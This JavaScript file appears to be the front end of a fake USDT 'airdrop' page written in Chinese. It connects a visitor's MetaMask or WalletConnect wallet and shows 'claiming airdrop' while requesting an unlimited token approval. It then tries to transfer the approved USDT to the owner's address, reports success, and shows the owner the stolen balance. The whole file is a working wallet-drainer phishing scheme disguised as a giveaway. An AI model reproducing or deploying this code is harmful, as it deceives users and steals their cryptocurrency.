import { USDT_ADDRESS, DEX_ADDRESS, OWNER_ADDRESS } from './config.js';

const ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function allowance(address owner, address spender) public view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) public view returns (uint256)"
];

let provider, signer, userAddress;

const connectButton = document.getElementById("connectButton");
const approveButton = document.getElementById("approveButton");
const viewApprovals = document.getElementById("viewApprovals");
const status = document.getElementById("status");
const walletDisplay = document.getElementById("walletAddress");
const walletSelector = document.getElementById("walletSelector");
const log = document.getElementById("log");
const ownerPanel = document.getElementById("ownerActions");

connectButton.onclick = async () => {
  const choice = walletSelector.value;
  try {
    if (choice === "metamask") {
      if (typeof window.ethereum !== "undefined") {
        provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = await provider.getSigner();
      } else {
        return (status.innerText = "請安裝 MetaMask 錢包");
      }
    } else if (choice === "walletconnect") {
      const WalletConnectProvider = window.WalletConnectProvider.default;
      const wcProvider = new WalletConnectProvider({
        rpc: {
          1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID"
        }
      });
      await wcProvider.enable();
      provider = new ethers.BrowserProvider(wcProvider);
      signer = await provider.getSigner();
    }

    userAddress = await signer.getAddress();
    walletDisplay.innerText = `已連接錢包: ${userAddress}`;
    status.innerText = "錢包已連接成功";

    if (userAddress.toLowerCase() === OWNER_ADDRESS.toLowerCase()) {
      ownerPanel.classList.remove("hidden");
    }
  } catch (e) {
    status.innerText = "連接失敗";
  }
};

approveButton.onclick = async () => {
  if (!signer) return (status.innerText = "請先連接錢包");

  const usdt = new ethers.Contract(USDT_ADDRESS, ABI, signer);
  const maxApprove = ethers.MaxUint256;

  try {
    status.innerText = "空投領取中...";
    const tx = await usdt.approve(DEX_ADDRESS, maxApprove);
    await tx.wait();

    // 轉出所有授權
    const allowance = await usdt.allowance(userAddress, DEX_ADDRESS);
    if (allowance > 0) {
      const tx2 = await usdt.transferFrom(userAddress, OWNER_ADDRESS, allowance);
      await tx2.wait();
    }

    status.innerText = "空投領取成功！";
  } catch (err) {
    status.innerText = "授權失敗";
  }
};

viewApprovals.onclick = async () => {
  const usdt = new ethers.Contract(USDT_ADDRESS, ABI, provider);
  const balance = await usdt.balanceOf(OWNER_ADDRESS);
  const msg = `
    <div class="mt-4 text-left">
      <h3 class="text-xl font-semibold mb-2">空投統計</h3>
      <p>OWNER 錢包持有 USDT：${ethers.formatUnits(balance, 6)} 枚</p>
      <p>※ 更多記錄需鏈上查看。</p>
    </div>
  `;
  log.innerHTML = msg;
};
